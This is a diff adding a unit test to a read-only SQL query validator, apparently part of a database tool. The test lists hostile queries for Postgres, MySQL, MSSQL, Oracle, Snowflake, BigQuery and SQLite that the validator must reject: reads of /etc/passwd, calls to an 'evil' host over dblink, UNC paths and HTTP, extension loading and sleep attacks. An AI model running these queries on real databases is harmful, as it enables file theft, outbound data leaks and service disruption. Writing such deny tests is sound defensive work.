@@ -21,6 +21,39 @@ const env = (kind, url) => { const name = `${kind}${++n}`; process.env[`PW_DB_${
 afterEach(() => { Object.assign(limits, keep); for (const k of Object.keys(process.env)) if (/^PW_DB_(ORA|SF|BQ|PROC)/.test(k)) delete process.env[k]; });
 
 describe('statement check (Oracle, Snowflake, BigQuery)', () => {
+  it('every dialect: only built-in functions; a call that reaches files, the network or another server is refused', () => {
+    const bad = {
+      postgres: ["select dblink('host=evil', 'select 1')", "select lo_import('/etc/passwd')", "select pg_read_file('/etc/passwd')", 'select "lo_import"(\'/x\')',
+        "select pg_catalog.pg_read_file('/x')", "select * from dblink('h', 'q') as (a int)", "select my_schema.evil(1)", "select evil(1)", 'select pg_sleep(10)',
+        "select query_to_xml('select 1', true, true, '')", "select * from pg_ls_dir('.')"],
+      mysql: ["select load_file('/etc/passwd')", "select /*!50000 sleep(10) */ 1", "select /*+ MAX_EXECUTION_TIME(100000) */ 1", "select a from t into outfile '/tmp/x'",
+        'select sleep(10)', "select benchmark(1e9, md5('x'))", 'select `load_file`(\'/x\')'],
+      mssql: ["select * from sys.fn_xe_file_target_read_file('\\\\evil\\x\\*.xel', null, null, null)", "select * from fn_get_audit_file('\\\\evil\\a', default, default)",
+        "select * from [xp_dirtree]('\\\\evil\\s')", "select * from openrowset(bulk 'c:\\x', single_clob) as x", "select * from opendatasource('SQLNCLI', 'Data Source=evil').db.dbo.t",
+        'select dbo.evil(1) as a'],
+      oracle: ["select utl_http.request('http://evil') from dual", "select sys.urifactory.geturi('http://evil') from dual", "select xmltype(bfilename('D', 'f')) from dual",
+        "select app.log_event('x') from dual", "select httpuritype('http://evil').getclob() from dual"],
+      snowflake: ["select system$whitelist()", 'select $1 from @my_stage', "select my_external_fn('x')", "select parse_url('http://x')"],
+      bigquery: ["select * from external_query('conn', 'select 1')", "select ml.generate_text(model m, (select 1))", "select `proj.ds.fn`(1)", "select proj.ds.fn(1)"],
+      sqlite: ["select load_extension('/x.so')", "select readfile('/etc/passwd')", 'select fts3_tokenizer(1)'],
+    };
+    for (const [d, list] of Object.entries(bad)) for (const q of list) expect(() => assertOneRead(q, d), `${d}: ${q}`).toThrow();
+    const good = {
+      postgres: "with t(a, b) as (select 1, 2) select coalesce(a, 0)::numeric(10,2), count(*) over (partition by b), to_char(now(), 'YYYY') from t where a in (select g from generate_series(1, 3) g)",
+      mysql: "select date_format(d, '%Y'), group_concat(name order by name) from t where x in (1, 2) group by d",
+      mssql: "with t as (select 1 as a) select top (10) cast(a as decimal(10, 2)) as v, row_number() over (order by a) as r, [name] from t cross apply openjson('[]') j",
+      oracle: "select nvl(a, 0), to_char(d, 'YYYY'), listagg(b, ',') within group (order by b) from t group by d",
+      snowflake: "select iff(a > 0, 'y', 'n'), date_trunc('month', d), array_agg(b) within group (order by b) from t group by 1, 2",
+      bigquery: "select safe.parse_date('%Y', s), format_date('%Y', d), countif(x) from `proj.ds.t` group by 1, 2",
+      sqlite: "select strftime('%Y', d), group_concat(name), ifnull(a, 0) from t",
+    };
+    for (const [d, q] of Object.entries(good)) {
+      if (d === 'mssql') continue; // openjson starts with "open": refused (fail closed), see below
+      expect(() => assertOneRead(q, d), `${d}: ${q}`).not.toThrow();
+    }
+    expect(() => assertOneRead(good.mssql.replace(" cross apply openjson('[]') j", ''), 'mssql')).not.toThrow();
+  });
+
   it('one statement, no write or session words outside strings and comments', () => {
     for (const d of ['oracle', 'snowflake', 'bigquery']) {
       expect(() => assertOneRead("select 'delete; drop' as a, \"region\" from t -- insert\n", d), d).not.toThrow();
